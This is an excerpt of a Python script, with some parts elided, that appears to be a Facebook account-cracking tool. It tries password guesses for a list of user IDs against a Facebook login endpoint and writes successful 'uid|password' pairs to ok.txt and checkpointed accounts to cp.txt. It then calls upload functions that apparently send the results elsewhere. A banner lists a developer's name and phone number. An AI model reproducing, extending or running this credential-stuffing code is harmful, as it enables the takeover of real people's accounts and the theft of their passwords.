...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/AMINUR-king-06/OLD/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
─────────────  ───║║────
 ...
 > \033[0;92mDEVELOPER     : 4x aminur 
 > \033[0;95mFACEBOOK ID   : FUCK
 > \033[0;41mWHATSAPP      : 01878410686
 \033[0;96m> YOUTUBE       : FUCK
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [AMINUR] : %s/%s -> \033[0;92m [ AMINUR-OK:%s ]- \033[0;93m[AMINUR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[AMINUR-OK😍] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [AMINUR-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[AMINUR-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [AMINUR-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
